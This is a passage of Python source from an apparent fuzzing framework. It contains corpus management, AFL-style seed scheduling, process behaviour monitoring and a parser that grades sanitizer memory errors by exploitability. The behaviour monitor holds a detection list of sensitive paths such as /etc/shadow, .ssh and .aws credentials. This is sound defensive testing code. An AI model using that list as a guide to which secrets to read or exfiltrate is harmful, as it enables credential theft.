            "edges_hit": self.edges_hit,
            "new_edges": self.new_edges,
            "edge_ids_sample": self.edge_ids_sample,
            "favored": self.favored,
            "depth": self.depth,
            "exec_count": self.exec_count,
            "found_crashes": self.found_crashes,
            "avg_exec_ms": self.avg_exec_ms,
            "last_exec_ms": self.last_exec_ms,
            "parent_id": self.parent_id,
            "mutation_type": self.mutation_type,
            "added_at": self.added_at,
        }


class CorpusManager:
    """
    Manages the fuzzing corpus with coverage-based prioritization.
    
    Features:
    - Input deduplication by coverage bitmap
    - Favored input selection (inputs covering unique edges)
    - Input minimization
    - Corpus trimming
    """
    
    EDGE_SAMPLE_LIMIT = 64

    def __init__(self, corpus_dir: Optional[str] = None, max_size: int = 10000):
        self.corpus_dir = corpus_dir or tempfile.mkdtemp(prefix="corpus_")
        os.makedirs(self.corpus_dir, exist_ok=True)
        
        self.max_size = max_size
        self.entries: Dict[str, CorpusEntry] = {}
        self.by_hash: Dict[str, str] = {}  # data_hash -> entry_id
        self.by_bitmap: Dict[str, str] = {}  # bitmap_hash -> entry_id
        
        # Coverage tracking for corpus
        self.edge_to_entry: Dict[int, str] = {}  # edge_index -> entry_id (first to hit)
        
        # Load existing corpus
        self._load_corpus()
    
    def _load_corpus(self):
        """Load existing corpus from disk."""
        index_path = os.path.join(self.corpus_dir, "index.json")
        if os.path.exists(index_path):
            try:
                with open(index_path, "r") as f:
                    data = json.load(f)
                for entry_data in data.get("entries", []):
                    entry = CorpusEntry(**entry_data)
                    # Load actual data
                    data_path = os.path.join(self.corpus_dir, f"{entry.id}.bin")
                    if os.path.exists(data_path):
                        with open(data_path, "rb") as f:
                            entry.data = f.read()
                        self.entries[entry.id] = entry
                        self.by_hash[entry.hash] = entry.id
                logger.info(f"Loaded {len(self.entries)} corpus entries")
            except Exception as e:
                logger.warning(f"Failed to load corpus: {e}")
    
    def _save_corpus(self):
        """Save corpus index to disk."""
        index_path = os.path.join(self.corpus_dir, "index.json")
        data = {
            "entries": [e.to_dict() for e in self.entries.values()],
            "total": len(self.entries),
        }
        with open(index_path, "w") as f:
            json.dump(data, f, indent=2)
    
    def add(
        self,
        data: bytes,
        coverage: Optional[CoverageInfo] = None,
        parent_id: Optional[str] = None,
        mutation_type: Optional[str] = None,
    ) -> Tuple[bool, Optional[CorpusEntry]]:
        """
        Add a new input to the corpus.
        
        Args:
            data: Input bytes
            coverage: Coverage info from execution
            parent_id: ID of parent input (if mutated)
            mutation_type: Type of mutation used
            
        Returns:
            Tuple of (was_added, entry)
        """
        data_hash = hashlib.sha256(data).hexdigest()
        
        # Check for duplicate by data hash
        if data_hash in self.by_hash:
            return False, self.entries.get(self.by_hash[data_hash])
        
        # Check for duplicate by coverage bitmap (if coverage-guided)
        if coverage and coverage.edge_bitmap:
            bitmap_hash = hashlib.sha256(coverage.edge_bitmap).hexdigest()[:16]
            if bitmap_hash in self.by_bitmap and coverage.new_edges == 0:
                return False, None
        else:
            bitmap_hash = ""
        
        # Check corpus size limit
        if len(self.entries) >= self.max_size:
            self._trim_corpus()
        
        edge_ids_sample: List[int] = []
        if coverage and coverage.hit_counts:
            edge_ids = list(coverage.hit_counts.keys())
            if len(edge_ids) <= self.EDGE_SAMPLE_LIMIT:
                edge_ids_sample = edge_ids
            else:
                edge_ids_sample = random.sample(edge_ids, self.EDGE_SAMPLE_LIMIT)

        # Create new entry
        entry = CorpusEntry(
            data=data,
            size=len(data),
            hash=data_hash,
            edges_hit=coverage.edge_count if coverage else 0,
            new_edges=coverage.new_edges if coverage else 0,
            edge_bitmap_hash=bitmap_hash,
            edge_ids_sample=edge_ids_sample,
            parent_id=parent_id,
            mutation_type=mutation_type,
            depth=(self.entries[parent_id].depth + 1) if parent_id and parent_id in self.entries else 0,
            handicap=4,
        )
        
        # Save data to disk
        data_path = os.path.join(self.corpus_dir, f"{entry.id}.bin")
        with open(data_path, "wb") as f:
            f.write(data)
        entry.filename = data_path
        
        # Add to indexes
        self.entries[entry.id] = entry
        self.by_hash[data_hash] = entry.id
        if bitmap_hash:
            self.by_bitmap[bitmap_hash] = entry.id
        
        # Update edge tracking for favored selection
        if coverage:
            self._update_favored(entry, coverage)
        
        # Save index
        self._save_corpus()
        
        return True, entry
    
    def _update_favored(self, entry: CorpusEntry, coverage: CoverageInfo):
        """Update favored status based on unique edge coverage."""
        for edge_idx in coverage.hit_counts.keys():
            if edge_idx not in self.edge_to_entry:
                self.edge_to_entry[edge_idx] = entry.id
                entry.favored = True
            else:
                # Check if this entry is smaller/better
                existing_id = self.edge_to_entry[edge_idx]
                existing = self.entries.get(existing_id)
                if existing and entry.size < existing.size:
                    self.edge_to_entry[edge_idx] = entry.id
                    entry.favored = True
                    # Recalculate favored status for existing
                    self._recalculate_favored(existing)
    
    def _recalculate_favored(self, entry: CorpusEntry):
        """Recalculate if entry is still favored for any edge."""
        entry.favored = any(
            eid == entry.id for eid in self.edge_to_entry.values()
        )
    
    def _trim_corpus(self):
        """Remove least valuable entries to stay under size limit."""
        if len(self.entries) < self.max_size:
            return
        
        # Sort by value (favored first, then by new_edges, then by exec_count)
        sorted_entries = sorted(
            self.entries.values(),
            key=lambda e: (e.favored, e.new_edges, -e.exec_count),
            reverse=True,
        )
        
        # Keep top entries
        keep_count = int(self.max_size * 0.8)
        entries_to_remove = sorted_entries[keep_count:]
        
        for entry in entries_to_remove:
            self._remove_entry(entry.id)
    
    def _remove_entry(self, entry_id: str):
        """Remove an entry from the corpus."""
        entry = self.entries.get(entry_id)
        if not entry:
            return
        
        # Remove from indexes
        if entry.hash in self.by_hash:
            del self.by_hash[entry.hash]
        if entry.edge_bitmap_hash in self.by_bitmap:
            del self.by_bitmap[entry.edge_bitmap_hash]
        
        # Remove from edge tracking
        for edge, eid in list(self.edge_to_entry.items()):
            if eid == entry_id:
                del self.edge_to_entry[edge]
        
        # Remove file
        if entry.filename and os.path.exists(entry.filename):
            try:
                os.remove(entry.filename)
            except:
                pass
        
        # Remove from entries
        del self.entries[entry_id]
    
    def get(self, entry_id: str) -> Optional[CorpusEntry]:
        """Get a corpus entry by ID."""
        return self.entries.get(entry_id)
    
    def get_all(self) -> List[CorpusEntry]:
        """Get all corpus entries."""
        return list(self.entries.values())
    
    def get_favored(self) -> List[CorpusEntry]:
        """Get all favored entries."""
        return [e for e in self.entries.values() if e.favored]
    
    def record_execution(
        self,
        entry_id: str,
        found_crash: bool = False,
        exec_time_ms: Optional[float] = None,
    ):
        """Record that an entry was executed."""
        entry = self.entries.get(entry_id)
        if entry:
            entry.exec_count += 1
            entry.last_exec_time = time.time()
            if exec_time_ms is not None:
                if entry.exec_count <= 1:
                    entry.avg_exec_ms = exec_time_ms
                else:
                    total = entry.avg_exec_ms * (entry.exec_count - 1)
                    entry.avg_exec_ms = (total + exec_time_ms) / entry.exec_count
                entry.last_exec_ms = exec_time_ms
            if entry.handicap > 0:
                entry.handicap -= 1
            if found_crash:
                entry.found_crashes += 1
    
    def get_stats(self) -> Dict[str, Any]:
        """Get corpus statistics."""
        total_size = sum(e.size for e in self.entries.values())
        favored_count = sum(1 for e in self.entries.values() if e.favored)
        
        return {
            "total_entries": len(self.entries),
            "total_size_bytes": total_size,
            "avg_size_bytes": total_size / max(1, len(self.entries)),
            "favored_count": favored_count,
            "max_depth": max((e.depth for e in self.entries.values()), default=0),
            "unique_edges_covered": len(self.edge_to_entry),
            "corpus_dir": self.corpus_dir,
        }


# =============================================================================
# SEED SCHEDULING (1e) - Phase 2
# =============================================================================

class SeedScheduler:
    """
    Schedules which corpus entries to mutate next.
    
    Implements multiple scheduling strategies:
    - Round-robin: Cycle through all entries
    - Favored-first: Prioritize entries covering unique edges
    - Rare-edge: Prioritize entries hitting rare edges
    - Power schedule: AFL-style adaptive scheduling
    """
    
    class Strategy(str, Enum):
        ROUND_ROBIN = "round_robin"
        FAVORED_FIRST = "favored_first"
        RARE_EDGE = "rare_edge"
        POWER_SCHEDULE = "power_schedule"
        RANDOM = "random"
    
    def __init__(
        self,
        corpus: CorpusManager,
        coverage: CoverageTracker,
        strategy: Strategy = Strategy.POWER_SCHEDULE,
    ):
        self.corpus = corpus
        self.coverage = coverage
        self.strategy = strategy
        
        # Round-robin state
        self.current_index = 0
        self.queue: List[str] = []
        
        # Power schedule state
        self.perf_score: Dict[str, float] = {}
        self.fuzz_count: Dict[str, int] = {}
        self.avg_exec_ms: float = 0.0
    
    def next(self) -> Optional[CorpusEntry]:
        """Get the next corpus entry to fuzz."""
        entries = list(self.corpus.entries.values())
        if not entries:
            return None
        
        if self.strategy == self.Strategy.ROUND_ROBIN:
            return self._round_robin(entries)
        elif self.strategy == self.Strategy.FAVORED_FIRST:
            return self._favored_first(entries)
        elif self.strategy == self.Strategy.RARE_EDGE:
            return self._rare_edge(entries)
        elif self.strategy == self.Strategy.POWER_SCHEDULE:
            return self._power_schedule(entries)
        else:
            return random.choice(entries)
    
    def _round_robin(self, entries: List[CorpusEntry]) -> CorpusEntry:
        """Simple round-robin scheduling."""
        if not self.queue or self.current_index >= len(self.queue):
            self.queue = [e.id for e in entries]
            self.current_index = 0
        
        entry_id = self.queue[self.current_index]
        self.current_index += 1
        
        return self.corpus.entries.get(entry_id) or entries[0]
    
    def _favored_first(self, entries: List[CorpusEntry]) -> CorpusEntry:
        """Prioritize favored entries, then others."""
        favored = [e for e in entries if e.favored]
        if favored:
            # Weighted selection: less-fuzzed entries have higher priority
            weights = [1.0 / (e.exec_count + 1) for e in favored]
            total = sum(weights)
            weights = [w / total for w in weights]
            return random.choices(favored, weights=weights)[0]
        return random.choice(entries)
    
    def _rare_edge(self, entries: List[CorpusEntry]) -> CorpusEntry:
        """Prioritize entries that hit rare edges."""
        def entry_rarity_score(entry: CorpusEntry) -> float:
            score = self._edge_rarity(entry)
            score += entry.new_edges * 2.0
            score += 1.0 / (entry.exec_count + 1)
            return score
        
        # Sort by rarity score
        scored = [(e, entry_rarity_score(e)) for e in entries]
        scored.sort(key=lambda x: x[1], reverse=True)
        
        # Select from top entries with some randomness
        top_count = max(1, len(scored) // 4)
        top_entries = [e for e, _ in scored[:top_count]]
        return random.choice(top_entries)
    
    def _power_schedule(self, entries: List[CorpusEntry]) -> CorpusEntry:
        """AFL-style power schedule with adaptive energy."""
        # Calculate performance score for each entry
        for entry in entries:
            if entry.id not in self.perf_score:
                self.perf_score[entry.id] = self._calculate_perf_score(entry)
        
        # Select based on performance score
        weights = []
        for entry in entries:
            score = self.perf_score.get(entry.id, 1.0)
            fuzz_count = self.fuzz_count.get(entry.id, 0)

            rarity = self._edge_rarity(entry)
            speed_factor = self._speed_factor(entry)
            handicap_boost = 1.0 + min(1.0, entry.handicap * 0.25)

            adjusted = score
            adjusted *= (1.0 + rarity)
            adjusted *= speed_factor
            adjusted *= handicap_boost

            # Reduce weight for heavily-fuzzed entries
            adjusted /= (1 + fuzz_count * 0.05)

            # Boost favored entries
            if entry.favored:
                adjusted *= 1.8

            weights.append(max(0.01, adjusted))
        
        # Normalize weights
        total = sum(weights)
        weights = [w / total for w in weights]
        
        selected = random.choices(entries, weights=weights)[0]
        self.fuzz_count[selected.id] = self.fuzz_count.get(selected.id, 0) + 1
        
        return selected
    
    def _calculate_perf_score(self, entry: CorpusEntry) -> float:
        """Calculate performance score for an entry (AFL-style)."""
        score = 100.0
        
        # Prefer smaller inputs
        if entry.size < 1024:
            score *= 2
        elif entry.size > 10240:
            score *= 0.5
        
        # Prefer entries with more new coverage
        score *= (1 + entry.new_edges * 0.5)
        
        # Prefer entries that found crashes
        score *= (1 + entry.found_crashes * 2)
        
        # Penalize deep entries (many mutations from seed)
        if entry.depth > 10:
            score *= 0.5
        
        return score
    
    def _edge_rarity(self, entry: CorpusEntry) -> float:
        """Estimate rarity for edges this entry hits."""
        if not entry.edge_ids_sample:
            return 0.0

        edge_counts = self.coverage.edge_hit_counts
        rarity_sum = 0.0
        for edge_id in entry.edge_ids_sample:
            rarity_sum += 1.0 / max(1, edge_counts.get(edge_id, 1))

        return rarity_sum / len(entry.edge_ids_sample)

    def _speed_factor(self, entry: CorpusEntry) -> float:
        """Prefer faster-executing entries to maximize throughput."""
        if entry.avg_exec_ms <= 0 or self.avg_exec_ms <= 0:
            return 1.0
        ratio = self.avg_exec_ms / entry.avg_exec_ms
        return max(0.25, min(4.0, ratio))

    def update_score(
        self,
        entry_id: str,
        found_new_coverage: bool,
        found_crash: bool,
        exec_time_ms: Optional[float] = None,
    ):
        """Update entry's score based on fuzzing results."""
        if entry_id not in self.perf_score:
            return
        
        if found_new_coverage:
            self.perf_score[entry_id] *= 1.5
        if found_crash:
            self.perf_score[entry_id] *= 2.0
        
        # Decay score over time
        self.perf_score[entry_id] *= 0.99

        if exec_time_ms is not None:
            if self.avg_exec_ms <= 0:
                self.avg_exec_ms = exec_time_ms
            else:
                self.avg_exec_ms = (self.avg_exec_ms * 0.95) + (exec_time_ms * 0.05)
    
    def get_stats(self) -> Dict[str, Any]:
        """Get scheduler statistics."""
        return {
            "strategy": self.strategy.value,
            "queue_length": len(self.queue),
            "current_index": self.current_index,
            "entries_scored": len(self.perf_score),
            "total_fuzz_count": sum(self.fuzz_count.values()),
            "avg_exec_ms": round(self.avg_exec_ms, 2),
        }


# =============================================================================
# BEHAVIOR MONITORING (4a-4e) - Phase 2
# =============================================================================

@dataclass
class BehaviorEvent:
    """A single behavior event from monitoring."""
    timestamp: float
    event_type: str  # file_read, file_write, registry_read, registry_write, network, process, thread
    operation: str
    path: str = ""
    data: str = ""
    result: str = ""
    pid: int = 0
    tid: int = 0
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class BehaviorProfile:
    """Behavior profile from an execution."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:12])
    events: List[BehaviorEvent] = field(default_factory=list)
    
    # Summary counts
    file_reads: int = 0
    file_writes: int = 0
    file_deletes: int = 0
    registry_reads: int = 0
    registry_writes: int = 0
    network_connections: int = 0
    processes_created: int = 0
    threads_created: int = 0
    
    # Interesting patterns
    sensitive_file_access: List[str] = field(default_factory=list)
    network_endpoints: List[str] = field(default_factory=list)
    suspicious_operations: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        result = asdict(self)
        result["events"] = [e.to_dict() for e in self.events]
        return result


class BehaviorMonitor:
    """
    Monitors process behavior during execution.
    
    Tracks:
    - File system operations (read, write, delete)
    - Registry operations (Windows)
    - Network connections
    - Process/thread creation
    - API calls (when available)
    """
    
    # Sensitive paths to flag
    SENSITIVE_PATHS = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "C:\\Windows\\System32\\config",
        "C:\\Users\\*\\AppData",
        ".ssh", ".gnupg", ".aws", ".azure",
        "password", "credential", "secret", "token", "key",
    ]
    
    def __init__(self):
        self.profiles: Dict[str, BehaviorProfile] = {}
    
    def start_monitoring(self, pid: int) -> str:
        """Start monitoring a process."""
        profile = BehaviorProfile()
        self.profiles[profile.id] = profile
        return profile.id
    
    def stop_monitoring(self, profile_id: str) -> Optional[BehaviorProfile]:
        """Stop monitoring and return the profile."""
        return self.profiles.get(profile_id)
    
    def record_event(self, profile_id: str, event: BehaviorEvent):
        """Record a behavior event."""
        profile = self.profiles.get(profile_id)
        if not profile:
            return
        
        profile.events.append(event)
        
        # Update counters
        if event.event_type == "file_read":
            profile.file_reads += 1
        elif event.event_type == "file_write":
            profile.file_writes += 1
        elif event.event_type == "file_delete":
            profile.file_deletes += 1
        elif event.event_type == "registry_read":
            profile.registry_reads += 1
        elif event.event_type == "registry_write":
            profile.registry_writes += 1
        elif event.event_type == "network":
            profile.network_connections += 1
            profile.network_endpoints.append(event.path)
        elif event.event_type == "process":
            profile.processes_created += 1
        elif event.event_type == "thread":
            profile.threads_created += 1
        
        # Check for sensitive access
        self._check_sensitive_access(profile, event)
    
    def _check_sensitive_access(self, profile: BehaviorProfile, event: BehaviorEvent):
        """Check if event involves sensitive resources."""
        path_lower = event.path.lower()
        
        for sensitive in self.SENSITIVE_PATHS:
            if sensitive.lower() in path_lower:
                profile.sensitive_file_access.append(event.path)
                profile.suspicious_operations.append(
                    f"{event.event_type}: {event.operation} on {event.path}"
                )
                break
    
    def analyze_profile(self, profile_id: str) -> Dict[str, Any]:
        """Analyze a behavior profile for anomalies."""
        profile = self.profiles.get(profile_id)
        if not profile:
            return {}
        
        analysis = {
            "total_events": len(profile.events),
            "file_operations": profile.file_reads + profile.file_writes + profile.file_deletes,
            "registry_operations": profile.registry_reads + profile.registry_writes,
            "network_operations": profile.network_connections,
            "process_operations": profile.processes_created + profile.threads_created,
            "sensitive_accesses": len(profile.sensitive_file_access),
            "suspicious_count": len(profile.suspicious_operations),
            "risk_level": "low",
        }
        
        # Determine risk level
        if len(profile.suspicious_operations) > 0:
            analysis["risk_level"] = "high"
        elif profile.network_connections > 0 and profile.file_writes > 5:
            analysis["risk_level"] = "medium"
        elif profile.processes_created > 0:
            analysis["risk_level"] = "medium"
        
        return analysis
    
    def get_profile(self, profile_id: str) -> Optional[BehaviorProfile]:
        """Get a behavior profile by ID."""
        return self.profiles.get(profile_id)


# =============================================================================
# MEMORY SAFETY DETECTION (5a-5e) - Phase 3
# =============================================================================

class MemoryErrorType(str, Enum):
    """Types of memory safety errors."""
    HEAP_BUFFER_OVERFLOW = "heap_buffer_overflow"
    HEAP_BUFFER_UNDERFLOW = "heap_buffer_underflow"
    HEAP_USE_AFTER_FREE = "heap_use_after_free"
    HEAP_DOUBLE_FREE = "heap_double_free"
    HEAP_INVALID_FREE = "heap_invalid_free"
    HEAP_CORRUPTION = "heap_corruption"
    STACK_BUFFER_OVERFLOW = "stack_buffer_overflow"
    STACK_BUFFER_UNDERFLOW = "stack_buffer_underflow"
    STACK_USE_AFTER_RETURN = "stack_use_after_return"
    STACK_USE_AFTER_SCOPE = "stack_use_after_scope"
    GLOBAL_BUFFER_OVERFLOW = "global_buffer_overflow"
    USE_OF_UNINITIALIZED = "use_of_uninitialized_memory"
    MEMORY_LEAK = "memory_leak"
    NULL_DEREFERENCE = "null_dereference"
    WILD_POINTER = "wild_pointer"
    INTEGER_OVERFLOW = "integer_overflow"
    FORMAT_STRING = "format_string"
    UNKNOWN = "unknown"


@dataclass
class MemoryAllocation:
    """Tracks a memory allocation for leak/corruption detection."""
    address: int
    size: int
    allocated_at: str  # Stack trace or location
    freed: bool = False
    freed_at: Optional[str] = None
    access_count: int = 0
    last_access: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "address": hex(self.address),
            "size": self.size,
            "allocated_at": self.allocated_at,
            "freed": self.freed,
            "freed_at": self.freed_at,
            "access_count": self.access_count,
        }


@dataclass
class MemoryError:
    """A detected memory safety error."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:12])
    error_type: MemoryErrorType = MemoryErrorType.UNKNOWN
    address: Optional[int] = None
    size: Optional[int] = None
    description: str = ""
    stack_trace: List[str] = field(default_factory=list)
    allocation_trace: List[str] = field(default_factory=list)
    free_trace: List[str] = field(default_factory=list)
    source_file: Optional[str] = None
    source_line: Optional[int] = None
    function_name: Optional[str] = None
    severity: CrashSeverity = CrashSeverity.UNKNOWN
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    raw_output: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        result = asdict(self)
        result["error_type"] = self.error_type.value
        result["severity"] = self.severity.value
        if self.address:
            result["address"] = hex(self.address)
        return result


class SanitizerParser:
    """
    Parses output from various memory sanitizers.
    
    Supports:
    - AddressSanitizer (ASan)
    - MemorySanitizer (MSan)
    - ThreadSanitizer (TSan)
    - UndefinedBehaviorSanitizer (UBSan)
    - Valgrind
    - Dr. Memory
    """
    
    # ASan error patterns
    ASAN_PATTERNS = {
        r"heap-buffer-overflow": MemoryErrorType.HEAP_BUFFER_OVERFLOW,
        r"heap-use-after-free": MemoryErrorType.HEAP_USE_AFTER_FREE,
        r"double-free": MemoryErrorType.HEAP_DOUBLE_FREE,
        r"invalid-free|attempting free on address": MemoryErrorType.HEAP_INVALID_FREE,
        r"stack-buffer-overflow": MemoryErrorType.STACK_BUFFER_OVERFLOW,
        r"stack-buffer-underflow": MemoryErrorType.STACK_BUFFER_UNDERFLOW,
        r"stack-use-after-return": MemoryErrorType.STACK_USE_AFTER_RETURN,
        r"stack-use-after-scope": MemoryErrorType.STACK_USE_AFTER_SCOPE,
        r"global-buffer-overflow": MemoryErrorType.GLOBAL_BUFFER_OVERFLOW,
        r"use-of-uninitialized-value": MemoryErrorType.USE_OF_UNINITIALIZED,
        r"SEGV on unknown address.*null": MemoryErrorType.NULL_DEREFERENCE,
        r"SEGV on unknown address": MemoryErrorType.WILD_POINTER,
        r"detected memory leaks": MemoryErrorType.MEMORY_LEAK,
        r"heap-buffer-underflow": MemoryErrorType.HEAP_BUFFER_UNDERFLOW,
    }
    
    # MSan patterns
    MSAN_PATTERNS = {
        r"use-of-uninitialized-value": MemoryErrorType.USE_OF_UNINITIALIZED,
        r"Uninitialized value": MemoryErrorType.USE_OF_UNINITIALIZED,
    }
    
    # UBSan patterns  
    UBSAN_PATTERNS = {
        r"signed integer overflow": MemoryErrorType.INTEGER_OVERFLOW,
        r"unsigned integer overflow": MemoryErrorType.INTEGER_OVERFLOW,
        r"division by zero": MemoryErrorType.UNKNOWN,
        r"null pointer": MemoryErrorType.NULL_DEREFERENCE,
        r"member access within null pointer": MemoryErrorType.NULL_DEREFERENCE,
    }
    
    # Valgrind patterns
    VALGRIND_PATTERNS = {
        r"Invalid read of size": MemoryErrorType.HEAP_USE_AFTER_FREE,
        r"Invalid write of size": MemoryErrorType.HEAP_USE_AFTER_FREE,
        r"Invalid free": MemoryErrorType.HEAP_INVALID_FREE,
        r"Mismatched free": MemoryErrorType.HEAP_INVALID_FREE,
        r"definitely lost": MemoryErrorType.MEMORY_LEAK,
        r"possibly lost": MemoryErrorType.MEMORY_LEAK,
        r"Use of uninitialised value": MemoryErrorType.USE_OF_UNINITIALIZED,
        r"Conditional jump.*uninitialised": MemoryErrorType.USE_OF_UNINITIALIZED,
    }
    
    @classmethod
    def parse_asan_output(cls, output: str) -> List[MemoryError]:
        """Parse AddressSanitizer output."""
        errors = []
        
        # Split into error blocks
        blocks = re.split(r'={10,}', output)
        
        for block in blocks:
            if not block.strip():
                continue
            
            error = MemoryError(raw_output=block)
            
            # Detect error type
            for pattern, error_type in cls.ASAN_PATTERNS.items():
                if re.search(pattern, block, re.IGNORECASE):
                    error.error_type = error_type
                    break
            
            # Extract address
            addr_match = re.search(r'on address (0x[0-9a-fA-F]+)', block)
            if addr_match:
                error.address = int(addr_match.group(1), 16)
            
            # Extract size
            size_match = re.search(r'of size (\d+)', block)
            if size_match:
                error.size = int(size_match.group(1))
            
            # Extract stack trace
            stack_lines = re.findall(r'#\d+\s+0x[0-9a-fA-F]+\s+.*', block)
            error.stack_trace = stack_lines[:20]  # Limit to 20 frames
            
            # Extract source location
            src_match = re.search(r'(\S+):(\d+):(\d+)', block)
            if src_match:
                error.source_file = src_match.group(1)
                error.source_line = int(src_match.group(2))
            
            # Extract function name
            func_match = re.search(r'in (\w+)', block)
            if func_match:
                error.function_name = func_match.group(1)
            
            # Extract allocation trace
            alloc_section = re.search(r'allocated by thread.*?(?=freed by|$)', block, re.DOTALL)
            if alloc_section:
                alloc_lines = re.findall(r'#\d+\s+0x[0-9a-fA-F]+\s+.*', alloc_section.group())
                error.allocation_trace = alloc_lines[:10]
            
            # Extract free trace
            free_section = re.search(r'freed by thread.*?(?=allocated by|$)', block, re.DOTALL)
            if free_section:
                free_lines = re.findall(r'#\d+\s+0x[0-9a-fA-F]+\s+.*', free_section.group())
                error.free_trace = free_lines[:10]
            
            # Set severity based on error type
            error.severity = cls._severity_for_error_type(error.error_type)
            
            # Generate description
            error.description = cls._generate_description(error)
            
            if error.error_type != MemoryErrorType.UNKNOWN:
                errors.append(error)
        
        return errors
    
    @classmethod
    def parse_valgrind_output(cls, output: str) -> List[MemoryError]:
        """Parse Valgrind output."""
        errors = []
        
        # Split by "==" markers
        blocks = re.split(r'==\d+==\s*\n', output)
        
        for block in blocks:
            if not block.strip():
                continue
            
            error = MemoryError(raw_output=block)
            
            # Detect error type
            for pattern, error_type in cls.VALGRIND_PATTERNS.items():
                if re.search(pattern, block, re.IGNORECASE):
                    error.error_type = error_type
                    break
            
            # Extract address
            addr_match = re.search(r'Address (0x[0-9a-fA-F]+)', block)
            if addr_match:
                error.address = int(addr_match.group(1), 16)
            
            # Extract size
            size_match = re.search(r'of size (\d+)', block)
            if size_match:
                error.size = int(size_match.group(1))
            
            # Extract stack trace (Valgrind format)
            stack_lines = re.findall(r'at 0x[0-9A-F]+:.*|by 0x[0-9A-F]+:.*', block)
            error.stack_trace = stack_lines[:20]
            
            # Extract source location
            src_match = re.search(r'\((\S+):(\d+)\)', block)
            if src_match:
                error.source_file = src_match.group(1)
                error.source_line = int(src_match.group(2))
            
            error.severity = cls._severity_for_error_type(error.error_type)
            error.description = cls._generate_description(error)
            
            if error.error_type != MemoryErrorType.UNKNOWN:
                errors.append(error)
        
        return errors
    
    @classmethod
    def parse_msan_output(cls, output: str) -> List[MemoryError]:
        """Parse MemorySanitizer output."""
        errors = []
        
        if "MemorySanitizer" not in output and "WARNING:" not in output:
            return errors
        
        error = MemoryError(raw_output=output)
        
        for pattern, error_type in cls.MSAN_PATTERNS.items():
            if re.search(pattern, output, re.IGNORECASE):
                error.error_type = error_type
                break
        
        # Extract stack trace
        stack_lines = re.findall(r'#\d+\s+0x[0-9a-fA-F]+\s+.*', output)
        error.stack_trace = stack_lines[:20]
        
        error.severity = CrashSeverity.PROBABLY_EXPLOITABLE
        error.description = cls._generate_description(error)
        
        if error.error_type != MemoryErrorType.UNKNOWN:
            errors.append(error)
        
        return errors
    
    @classmethod
    def parse_ubsan_output(cls, output: str) -> List[MemoryError]:
        """Parse UndefinedBehaviorSanitizer output."""
        errors = []
        
        for pattern, error_type in cls.UBSAN_PATTERNS.items():
            matches = re.finditer(pattern, output, re.IGNORECASE)
            for match in matches:
                error = MemoryError(
                    error_type=error_type,
                    raw_output=output[max(0, match.start()-100):match.end()+200],
                )
                
                # Extract source location (UBSan format: file:line:col)
                src_match = re.search(r'(\S+):(\d+):(\d+):', output[match.start():])
                if src_match:
                    error.source_file = src_match.group(1)
                    error.source_line = int(src_match.group(2))
                
                error.severity = cls._severity_for_error_type(error_type)
                error.description = cls._generate_description(error)
                errors.append(error)
        
        return errors
    
    @classmethod
    def parse_any(cls, output: str) -> List[MemoryError]:
        """Auto-detect and parse sanitizer output."""
        errors = []
        
        # Try each parser
        if "AddressSanitizer" in output or "ASAN" in output:
            errors.extend(cls.parse_asan_output(output))
        
        if "MemorySanitizer" in output or "MSAN" in output:
            errors.extend(cls.parse_msan_output(output))
        
        if "UndefinedBehaviorSanitizer" in output or "runtime error:" in output:
            errors.extend(cls.parse_ubsan_output(output))
        
        if "Valgrind" in output or "==PID==" in output or re.search(r'==\d+==', output):
            errors.extend(cls.parse_valgrind_output(output))
        
        return errors
    
    @staticmethod
    def _severity_for_error_type(error_type: MemoryErrorType) -> CrashSeverity:
        """Map memory error type to crash severity."""
        high_severity = {
            MemoryErrorType.HEAP_BUFFER_OVERFLOW,
            MemoryErrorType.STACK_BUFFER_OVERFLOW,
            MemoryErrorType.HEAP_USE_AFTER_FREE,
            MemoryErrorType.HEAP_DOUBLE_FREE,
            MemoryErrorType.FORMAT_STRING,
        }
        
        medium_severity = {
            MemoryErrorType.HEAP_BUFFER_UNDERFLOW,
            MemoryErrorType.STACK_BUFFER_UNDERFLOW,
            MemoryErrorType.GLOBAL_BUFFER_OVERFLOW,
            MemoryErrorType.HEAP_INVALID_FREE,
            MemoryErrorType.WILD_POINTER,
            MemoryErrorType.STACK_USE_AFTER_RETURN,
            MemoryErrorType.STACK_USE_AFTER_SCOPE,
            MemoryErrorType.HEAP_CORRUPTION,
        }
        
        if error_type in high_severity:
            return CrashSeverity.EXPLOITABLE
        elif error_type in medium_severity:
            return CrashSeverity.PROBABLY_EXPLOITABLE
        else:
            return CrashSeverity.PROBABLY_NOT_EXPLOITABLE
    
    @staticmethod
    def _generate_description(error: MemoryError) -> str:
        """Generate human-readable description."""
        desc_map = {
            MemoryErrorType.HEAP_BUFFER_OVERFLOW: "Heap buffer overflow - write/read beyond allocated heap memory",
            MemoryErrorType.HEAP_BUFFER_UNDERFLOW: "Heap buffer underflow - write/read before allocated heap memory",
            MemoryErrorType.HEAP_USE_AFTER_FREE: "Use-after-free - accessing heap memory after it was freed",
            MemoryErrorType.HEAP_DOUBLE_FREE: "Double free - attempting to free already freed memory",
            MemoryErrorType.HEAP_INVALID_FREE: "Invalid free - freeing memory not from heap or already freed",
            MemoryErrorType.HEAP_CORRUPTION: "Heap corruption - heap metadata corruption detected",
            MemoryErrorType.STACK_BUFFER_OVERFLOW: "Stack buffer overflow - write beyond stack buffer bounds",
            MemoryErrorType.STACK_BUFFER_UNDERFLOW: "Stack buffer underflow - write before stack buffer bounds",
            MemoryErrorType.STACK_USE_AFTER_RETURN: "Stack use after return - accessing stack memory after function returned",
            MemoryErrorType.STACK_USE_AFTER_SCOPE: "Stack use after scope - accessing stack memory after scope ended",
            MemoryErrorType.GLOBAL_BUFFER_OVERFLOW: "Global buffer overflow - write beyond global/static buffer bounds",
            MemoryErrorType.USE_OF_UNINITIALIZED: "Use of uninitialized memory - reading memory that was never written",
            MemoryErrorType.MEMORY_LEAK: "Memory leak - allocated memory was never freed",
            MemoryErrorType.NULL_DEREFERENCE: "Null pointer dereference - accessing memory through null pointer",
            MemoryErrorType.WILD_POINTER: "Wild pointer dereference - accessing memory through invalid pointer",
